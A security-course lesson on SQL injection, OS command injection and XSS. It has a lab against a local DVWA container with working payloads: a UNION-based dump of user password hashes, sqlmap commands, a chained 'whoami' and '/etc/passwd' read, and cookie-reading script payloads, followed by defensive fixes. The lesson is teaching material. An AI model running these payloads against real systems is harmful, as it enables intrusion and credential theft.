# Day 8 — Web Attacks I: Injection & XSS

## Objectives

By the end of today you should be able to:

- Explain, in one sentence, what **injection** actually is as a category — not "SQL
  injection specifically," but the general failure of mixing untrusted data into a
  string an interpreter later parses as *code* or *commands*.
- Manually confirm and exploit a SQL injection point (error-based probe, then a
  column-matched **UNION-based** payload), then reproduce the same finding faster with
  `sqlmap`, and say precisely what each approach gives you that the other doesn't.
- Exploit an OS **command injection** point by chaining a second command onto an
  input a server-side script passes unsanitized to a shell.
- Tell **reflected**, **stored**, and **DOM-based** XSS apart by *where the payload
  lives between requests*, not by what the payload looks like — and demonstrate a
  reflected and a stored example live.
- Explain why **parameterized queries / prepared statements** close the entire SQLi
  class structurally (not just today's specific payloads), and why **context-aware
  output encoding** is the equivalent structural fix for XSS.
- Name **CSP (Content-Security-Policy)** as a real, useful XSS mitigation and also say
  precisely why it's defense-in-depth, not a substitute for encoding untrusted output.

## 1. Concept — Injection, SQLi, Command Injection, and XSS

### Injection, as one category

**Injection** is what happens whenever a program builds a string meant for one
interpreter (SQL, a shell, an HTML/JS parser) by splicing in untrusted input, and that
interpreter can't tell "the trusted structure the developer wrote" apart from "the
attacker-controlled data that got pasted into it." Every injection class below — SQLi,
command injection, and XSS — is the *same* underlying failure, aimed at a different
interpreter. Naming it this way matters because the fix is also structurally the same
in every case: **stop building strings by concatenation; keep code/structure and data
in separate channels the interpreter can't confuse.**

### SQL injection — in-band vs. blind, and why UNION needs to match shape

A SQL injection point exists wherever untrusted input reaches a SQL query as literal
text rather than as a bound parameter. A classic vulnerable pattern:

```php
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

If `$id` is `1`, the query is exactly what the developer intended. If `$id` is
`1' OR '1'='1`, the query becomes `... WHERE user_id = '1' OR '1'='1'` — a condition
that's always true, returning every row instead of one. That single-quote probe (does
the app error out, or does the result set change shape?) is usually the *first* thing
you try against a suspected injection point, before building anything more elaborate.

SQLi splits into two regimes with very different attacker economics:

- **In-band SQLi** — the injected query's results (or its error message) come back
  directly in the HTTP response. This includes **error-based** (a database error
  message leaks schema/data) and **UNION-based** (append a second `SELECT` via `UNION`
  whose results get rendered in the same place the original query's results would have
  been). UNION-based has one hard constraint that trips up almost everyone the first
  time: **the injected `SELECT` must return the same number of columns, in
  compatible types, as the original query** — `UNION` is a strict set operation, not a
  join. If the original query selects 2 columns, your injected `UNION SELECT` must
  supply exactly 2 values, which is why the very first step of a manual UNION attack is
  always *finding the column count* (`ORDER BY N` until it errors, or
  `UNION SELECT NULL,NULL,...` until it stops erroring) — not guessing the payload
  outright.
- **Blind SQLi** — the response never shows the query's data or a distinguishing
  error; the *only* signal available is a behavioral difference. **Boolean-based blind**
  infers each yes/no fact by whether a `TRUE`/`FALSE` condition changes the page's
  content or size at all (e.g. `id=1' AND '1'='1` vs `id=1' AND '1'='2`). **Time-based
  blind** infers it purely from response latency, when even the page's content is
  identical either way (e.g. `id=1' AND IF(1=1, SLEEP(5), 0)` — a 5-second delay means
  "true," an instant response means "false"). Blind SQLi is strictly harder and slower
  to exploit manually (one bit of information per request), which is exactly the case
  where automating with `sqlmap` earns its keep — Attack Lab Step 3 below.

### Command injection — the same failure, aimed at a shell

**Command injection** is the identical pattern aimed at an OS shell instead of a SQL
engine: untrusted input reaches a function that hands a string to `/bin/sh` (PHP's
`system()`/`exec()`/`shell_exec()`, Python's `os.system()`, etc.) without sanitization.
Shell metacharacters — `;`, `&&`, `||`, `|`, backticks, `$()` — let an attacker append
an entirely separate command onto whatever the developer intended to run. If a "ping
this host" feature runs `ping -c 3 $ip` via a shell, and `$ip` is
`127.0.0.1 && whoami`, the shell happily runs both `ping -c 3 127.0.0.1` *and*
`whoami`, because `&&` is a shell-level command separator, not something `ping` itself
ever sees or cares about.

### XSS — three types, told apart by *where the payload lives*

**Cross-Site Scripting (XSS)** is injection aimed at the browser's HTML/JS parser: an
attacker gets their own `<script>` (or an equivalent HTML-attribute/event-handler
trick) to execute in a victim's browser, in the security context of the vulnerable
site — reading cookies, forging actions as the victim, defacing the page. The three
types are distinguished by **where the malicious payload lives between the attacker
planting it and the victim's browser executing it** — not by what the payload string
looks like, which can be identical across all three:

- **Reflected XSS** — the payload lives *only in the current request* (a URL query
  parameter, a form field) and is echoed back into the immediate response, unsanitized.
  It never touches storage. The attack requires getting a *specific victim* to click a
  crafted link containing the payload — it can't just sit there waiting.
- **Stored XSS** — the payload is saved server-side (a database row, a comment, a
  profile field) and gets rendered, unsanitized, into a page *every* future visitor
  loads — no crafted link needed per victim. This is strictly more dangerous: one
  successful injection compromises every subsequent viewer of that stored content,
  automatically.
- **DOM-based XSS** — the payload never even round-trips to the server at all; client-
  side JavaScript itself reads untrusted data (e.g. `location.hash`,
  `document.referrer`) and writes it into the page (e.g. via `innerHTML`) without
  sanitization, entirely within the browser. The server-side code can be perfectly
  correct and this bug still exists, because the vulnerable code path never involves
  the server.

### Output encoding — the structural fix for XSS, and why context matters

**Output encoding** means transforming untrusted data so the characters that would
otherwise be interpreted as HTML/JS structure (`<`, `>`, `&`, `"`, `'`) become inert
text instead — e.g. `<` becomes `&lt;`, so `<script>` renders as the literal text
`<script>` on the page instead of executing as a tag. The encoding must match the
**context** the data lands in: HTML-entity encoding is correct inside an HTML body,
but data placed inside a `<script>` block, inside an HTML attribute, or inside a URL
needs a *different* encoding scheme each time — using the wrong one for the context is
a common, real way encoding-based fixes still fail.

### Prepared statements — the structural fix for SQLi

A **prepared statement** (parameterized query) sends the query's *structure* to the
database separately from its *data*, using placeholders (`?` or named params) that the
database binds literal values into **after** the query has already been parsed as SQL:

```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

Because the database parses the query shape *before* `$id`'s value is ever
substituted in, there is no string for a `'` or `UNION` inside `$id` to break out of —
the value is always treated as pure data, no matter what characters it contains. This
is why prepared statements close the *entire* SQLi class structurally, rather than
patching one payload at a time the way blocklisting dangerous characters does (and
blocklisting reliably fails against encoding tricks and edge cases the blocklist's
author didn't anticipate).

### CSP — real, but defense-in-depth, not a substitute

**Content-Security-Policy (CSP)** is an HTTP response header that tells the browser
which sources of script/style/etc. are allowed to execute on the page (e.g.
`script-src 'self'`, disallowing inline `<script>` tags entirely). A strict CSP can
stop an XSS payload from ever executing even if it *does* get injected into the page —
a real, meaningful second layer. It is not a substitute for output encoding: CSP is a
browser-side backstop that depends on every browser respecting it and the policy being
configured correctly (a permissive policy, or one that still allows `'unsafe-inline'`,
protects nothing); encoding prevents the injection from succeeding in the first place,
at the source. Today's Defense Lab treats CSP as a named checklist item, not a
re-attacked-and-reverified control.

## 2. Attack Lab — Manual SQLi, `sqlmap`, Command Injection, Reflected + Stored XSS

**Authorized use only:** everything below runs against `dvwa`, a container this lab
starts on the shared `cyberlab` network — never against a real website you don't own
or don't have explicit written authorization to test.

Bring up both labs (after `labs/base/up.sh` if you haven't already), then stage this
lab's setup script with a plain `cp` (no extra container — `/loot` is just a bind
mount), and run it to initialize DVWA's database, log in as `admin`, and set the
security level to `low`:

```sh
cd cyber_security/labs/base
./up.sh
cd ../day08
docker compose up -d
mkdir -p ../base/loot/day08
cp dvwa_setup.sh ../base/loot/day08/
cd ../base
docker compose exec attacker sh -c "bash /loot/day08/dvwa_setup.sh low | tee /loot/day08/cookie.txt"
```

`labs/day08/docker-compose.yml` adds **only** the `dvwa` service — it does not
redefine `attacker`. Every command below runs from `labs/base`, where `attacker` is
actually defined. `dvwa_setup.sh` does everything a browser-based "click through
setup.php, log in, pick a security level" walkthrough would do, but via `curl` from
inside the attacker container — no host browser or published port needed. It prints a
`Cookie: PHPSESSID=...; security=low` line; the exact captured value from a real run,
plus every raw request/response this script sends, is in
[`labs/day08/SOLUTION.md`](../labs/day08/SOLUTION.md). Every command below assumes
you've captured that cookie value into a shell variable:

```sh
docker compose exec attacker sh -c "
COOKIE=\$(bash /loot/day08/dvwa_setup.sh low | tail -1 | sed 's/^Cookie: //')
echo \"COOKIE=\$COOKIE\"
"
```

### Step 1 — Recon: confirm the SQLi point manually

```sh
docker compose exec attacker sh -c '
COOKIE=$(bash /loot/day08/dvwa_setup.sh low | tail -1 | sed "s/^Cookie: //")
curl -s -H "Cookie: $COOKIE" "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#"
echo
curl -s -H "Cookie: $COOKIE" "http://dvwa/vulnerabilities/sqli/?id=1%27&Submit=Submit#"
'
```

**What you should see:** the first request returns a normal "First name: ... Surname:
..." result for user ID `1`. The second — the bare single-quote probe from Section 1 —
breaks the query's syntax and the page's output changes shape (an error, or an empty
result instead of a name), confirming `id` reaches the SQL query as unescaped literal
text. This is the exact "does the shape change?" signal Section 1 described.

### Step 2 — Find the column count, then a manual UNION-based dump

```sh
docker compose exec attacker sh -c '
COOKIE=$(bash /loot/day08/dvwa_setup.sh low | tail -1 | sed "s/^Cookie: //")
curl -s -H "Cookie: $COOKIE" "http://dvwa/vulnerabilities/sqli/?id=1%27+ORDER+BY+3--+-&Submit=Submit#"
echo
curl -s -H "Cookie: $COOKIE" "http://dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users--+-&Submit=Submit#"
'
```

**What you should see:** `ORDER BY 3` errors out (only 2 columns exist), confirming the
column count Section 1 said UNION requires you to find first. The second request's
`UNION SELECT user,password FROM users -- -` then returns every row of DVWA's `users`
table — usernames and password hashes — rendered into the same "First name / Surname"
slots the original query used, because the injected `SELECT` supplies exactly 2 values
of compatible type. Full captured output (every hash, every username):
[`labs/day08/SOLUTION.md`](../labs/day08/SOLUTION.md).

### Step 3 — Automate the same finding with `sqlmap`

```sh
docker compose exec attacker sh -c '
COOKIE=$(bash /loot/day08/dvwa_setup.sh low | tail -1 | sed "s/^Cookie: //")
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" --batch --dbs
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" --batch -D dvwa -T users -C user,password --dump
'
```

**What you should see:** the first command lists `available databases` (including
`dvwa`), and the second dumps the `users` table's `user`/`password` columns directly —
the identical data Step 2 pulled by hand, without you having to work out the column
count or write the `UNION` payload yourself. This is exactly Section 1's point about
`sqlmap`'s value: it doesn't find anything Step 2 couldn't, it just automates the
column-counting and payload construction — the gap widens dramatically once you're
dealing with **blind** SQLi, where each fact costs one full request instead of showing
up directly in the response.

### Step 4 — Command injection

```sh
docker compose exec attacker sh -c '
COOKIE=$(bash /loot/day08/dvwa_setup.sh low | tail -1 | sed "s/^Cookie: //")
curl -s -H "Cookie: $COOKIE" --data-urlencode "ip=127.0.0.1 && whoami" --data-urlencode "Submit=Submit" "http://dvwa/vulnerabilities/exec/"
'
```

**What you should see:** the ping output for `127.0.0.1`, immediately followed by the
output of `whoami` (something like `www-data`) — the exact chained-command pattern
Section 1 described, because the page's PHP hands `$ip` straight to a shell without
sanitizing the `&&`.

### Step 5 — Reflected XSS

```sh
docker compose exec attacker sh -c '
COOKIE=$(bash /loot/day08/dvwa_setup.sh low | tail -1 | sed "s/^Cookie: //")
curl -s -H "Cookie: $COOKIE" --data-urlencode "name=<script>alert(1)</script>" -G "http://dvwa/vulnerabilities/xss_r/"
'
```

**What you should see:** the response body contains the literal, unencoded
`<script>alert(1)</script>` string spliced directly into the page's HTML — proof the
`name` parameter is echoed back with no output encoding. In a real browser this would
execute; from `curl` you're confirming the *injection point*, matching Section 1's
definition of reflected XSS: the payload lives only in this one request/response pair
and never touches storage.

### Step 6 — Stored XSS

```sh
docker compose exec attacker sh -c '
COOKIE=$(bash /loot/day08/dvwa_setup.sh low | tail -1 | sed "s/^Cookie: //")
curl -s -H "Cookie: $COOKIE" --data-urlencode "txtName=attacker" --data-urlencode "mtxMessage=<script>alert(document.cookie)</script>" --data-urlencode "btnSign=Sign Guestbook" "http://dvwa/vulnerabilities/xss_s/"
curl -s -H "Cookie: $COOKIE" "http://dvwa/vulnerabilities/xss_s/"
'
```

**What you should see:** the first request posts the payload to the guestbook; the
**second, separate** request — simulating any future visitor simply loading the page —
still contains the unencoded `<script>` tag in its response, with no payload resubmitted
this time. That's the defining difference from Step 5: the payload persisted in
storage and now fires for every subsequent viewer, not just the one request that
planted it.

### Verify

```sh
cd cyber_security/labs/base
docker compose exec attacker sh -c '
COOKIE=$(bash /loot/day08/dvwa_setup.sh low | tail -1 | sed "s/^Cookie: //")
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" --batch --dbs 2>/dev/null | grep -qi "available databases" && echo ATTACK_OK
'
```

Expected: `ATTACK_OK`. The exact captured cookie value, security level, and full
request/response for every step above: [`labs/day08/SOLUTION.md`](../labs/day08/SOLUTION.md).

## 3. Defense Lab — Prepared Statements, Output Encoding, Command-Injection Fixes

DVWA ships each vulnerability at four security levels (`low`/`medium`/`high`/
`impossible`), each backed by a genuinely different PHP implementation of the same
page — `impossible` is DVWA's own reference-correct fix. This lets you re-verify a
defense by literally switching levels and re-running the identical attack, rather than
editing source yourself.

### Defense 1 — Prepared statements close the SQLi class

Re-run Step 2/3 against `impossible` instead of `low`:

```sh
docker compose exec attacker sh -c '
COOKIE=$(bash /loot/day08/dvwa_setup.sh impossible | tail -1 | sed "s/^Cookie: //")
curl -s -H "Cookie: $COOKIE" "http://dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users--+-&Submit=Submit#"
'
```

**What you should see:** no dumped rows — `impossible`'s PHP source
(`vulnerabilities/sqli/source/impossible.php` inside the `dvwa` container) uses a PDO
prepared statement with a bound `?` placeholder for `id`, exactly matching Section 1's
snippet. The single quote in the payload is now just a literal character inside the
bound parameter's value — there's no query string for it to break out of. Compare that
file directly against `low.php`'s string concatenation to see the entire fix is one
structural change, not extra validation logic bolted on. Full before/after transcript:
`labs/day08/SOLUTION.md`.

### Defense 2 — Output encoding closes reflected/stored XSS

Re-run Step 5 against `impossible`:

```sh
docker compose exec attacker sh -c '
COOKIE=$(bash /loot/day08/dvwa_setup.sh impossible | tail -1 | sed "s/^Cookie: //")
curl -s -H "Cookie: $COOKIE" --data-urlencode "name=<script>alert(1)</script>" -G "http://dvwa/vulnerabilities/xss_r/"
'
```

**What you should see:** the response now contains `&lt;script&gt;alert(1)&lt;/script&gt;`
— `impossible.php` runs the `name` value through `htmlspecialchars()` before
echoing it, so the browser renders inert text instead of parsing a tag. Nothing about
*validating* the input changed; the fix is purely about how the same untrusted value is
*encoded* on the way out, matching Section 1's "context-aware output encoding" fix
precisely.

### Defense 3 — Command-injection fix: stop shelling out to unsanitized input

DVWA's `exec/source/impossible.php` fixes Step 4's bug two ways at once, worth naming
both: it validates the input is a syntactically well-formed IP address before using it
at all (an allowlist on *shape*, not a blocklist on dangerous characters), and separately
demonstrates the general-purpose fix real code should reach for first —
`escapeshellarg()` (or, better, avoiding a shell entirely by calling an exec function
with an argument array instead of one interpolated command string, so there's no shell
metacharacter parsing step for `&&`/`;`/backticks to ever exploit).

### Defense 4 — Named but not re-demonstrated here

- **CSP (`Content-Security-Policy`)** — described in Section 1; a real second layer
  against XSS that depends on correct, strict configuration (no `'unsafe-inline'`) to
  do anything, and doesn't fix an injection point on its own — out of scope for DVWA's
  own security-level toggle, since DVWA doesn't ship a CSP header at any level.
- **Least-privilege DB accounts** — the app's DB user should never have permissions
  beyond what the app needs (no `DROP`, no cross-schema `UNION` targets); doesn't stop
  injection but bounds the damage once it happens.

## 4. Drills

Attempt each drill yourself before reading its solution sketch.

### Drill 1 — Turn a given query into a UNION-based SQLi payload

You're told the vulnerable query behind a login page is:

```sql
SELECT id, username FROM accounts WHERE username = '$user' AND status = 'active'
```

Craft the value for `$user` that uses `UNION SELECT` to leak every row's `password`
column from an `accounts` table that also has an `id`, `username`, and `password`
column — assuming you've already confirmed (by trial) that this query returns exactly
2 columns to the page.

**Hint:** the original query selects 2 columns (`id`, `username`) — your injected
`UNION SELECT` must supply exactly 2 values of compatible type, and you need to close
off the rest of the original query (the trailing `AND status = 'active'`) so it doesn't
interfere.

**Solution sketch:**

```
' UNION SELECT id, password FROM accounts -- -
```

This closes the `username = '` string early with the leading `'`, appends a
`UNION SELECT` returning exactly 2 values (`id`, `password` — matching the original
2-column shape), and comments out the rest of the original query
(`AND status = 'active'`) with `-- -` so it never executes and can't break the syntax.

### Drill 2 — Write the parameterized-query fix

Here's a vulnerable Python/SQLite snippet:

```python
def get_user(username):
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    return db.execute(query).fetchone()
```

Rewrite it as a parameterized query that closes the injection point structurally.

**Hint:** the fix isn't "add validation to `username`" — it's changing *how the query
and the value reach the database* so there's no string concatenation at all. Most
Python DB drivers use `?` placeholders and a separate values tuple/list passed to
`execute()`.

**Solution sketch:**

```python
def get_user(username):
    query = "SELECT * FROM users WHERE username = ?"
    return db.execute(query, (username,)).fetchone()
```

The query's structure (`... WHERE username = ?`) is now fixed and parsed by the
database before `username`'s actual value is bound in — exactly Section 1's
"structure and data travel separately" fix. `username` can now contain a literal `'`,
`UNION`, or anything else and it's treated purely as data, never as SQL syntax.

### Drill 3 — Classify 3 XSS snippets and give the fix for each

For each snippet, name which XSS type it is (reflected, stored, or DOM-based) and the
specific encoding/fix that stops it.

1. A search page renders `<p>You searched for: <?= $_GET['q'] ?></p>` with no
   encoding function around `$_GET['q']`.
2. A blog comment section saves each comment to a database as submitted, then renders
   every past comment on every page load with `echo $comment;` and no encoding.
3. A single-page app reads `document.location.hash` and writes it straight into the
   page with `element.innerHTML = location.hash.substring(1);`, entirely client-side.

**Hint:** ask, for each one, whether the payload ever touches server-side storage
(stored), only exists within the current request/response (reflected), or never
reaches the server's code path at all (DOM-based).

**Solution sketch:**

1. **Reflected** — `$_GET['q']` is echoed straight back into this one response, with
   no storage involved. Fix: HTML-entity encode with `htmlspecialchars($_GET['q'], ENT_QUOTES)`
   before echoing it — Defense 2's exact fix.
2. **Stored** — the comment is saved to a database and re-rendered, unsanitized, for
   *every* future visitor, not just the one who submitted it. Fix: the same
   `htmlspecialchars()`-style output encoding, applied at render time (when the comment
   is echoed), not at save time — encoding on the way out is what actually matters,
   regardless of what's stored.
3. **DOM-based** — the payload (`location.hash`) never touches the server at all; it's
   read and written into the page entirely in client-side JavaScript. Fix: never assign
   untrusted data to `innerHTML` directly — use `textContent` (which never parses HTML)
   when you only need to display text, or a browser-provided sanitizer if HTML markup
   is genuinely required.

### Drill 4 — Command injection: name the metacharacter and the fix

Given this vulnerable PHP:

```php
$host = $_GET['host'];
system("ping -c 3 " . $host);
```

If a request sends `host=8.8.8.8; cat /etc/passwd`, name exactly which character
enabled a second command to run, and name the specific fix (not "validate the input"
vaguely — name the actual mechanism).

**Hint:** think about what `;` means to a shell specifically, as opposed to what it
means to the `ping` binary itself — `ping` never sees or interprets it at all.

**Solution sketch:** the `;` is a shell command separator — `system()` hands its
entire string argument to `/bin/sh`, which reads `ping -c 3 8.8.8.8` and
`cat /etc/passwd` as two completely separate commands to run in sequence, joined by
`;`; `ping` itself never receives or parses the second half at all. The specific fix:
either avoid a shell entirely by calling an exec function that takes arguments as an
array (`escapeshellarg()`'d, or better, a non-shell exec API) so there's no shell
metacharacter-parsing step to exploit, or, if a shell command string is unavoidable,
wrap every interpolated value in `escapeshellarg()` — which quotes the value so shell
metacharacters inside it are treated as literal text, not syntax — combined with an
allowlist check that `$host` is even shaped like a valid hostname/IP in the first
place (Defense 3's DVWA `impossible` fix does exactly both).

## 5. Journal Prompt

Open `journal.md` and write today's entry using the template at the top of that file:

- **What I attacked:** name the exact UNION payload you used, the command-injection
  chain, and which XSS type(s) you fired for real — reflected and stored both,
  distinguished by whether you needed a second request to see it fire again.
- **How:** which manual step (finding the column count, or the shell metacharacter)
  took longer than letting `sqlmap` or the DVWA payload just work — and what did doing
  it manually first teach you that jumping straight to the tool wouldn't have?
- **What defended it:** which DVWA `impossible`-level fix did you actually re-run
  yourself (prepared statement, output encoding, or the command-injection allowlist),
  and what changed in the response before vs. after?
- **What confused me:** anything about *why* UNION needs matching column counts, or
  why encoding has to match its output context, that didn't click on first pass.
- **One thing to revisit:** pick one term from today (injection, UNION-based, blind
  SQLi, reflected/stored/DOM XSS, output encoding, prepared statement, CSP) to
  re-explain from memory before Day 9.
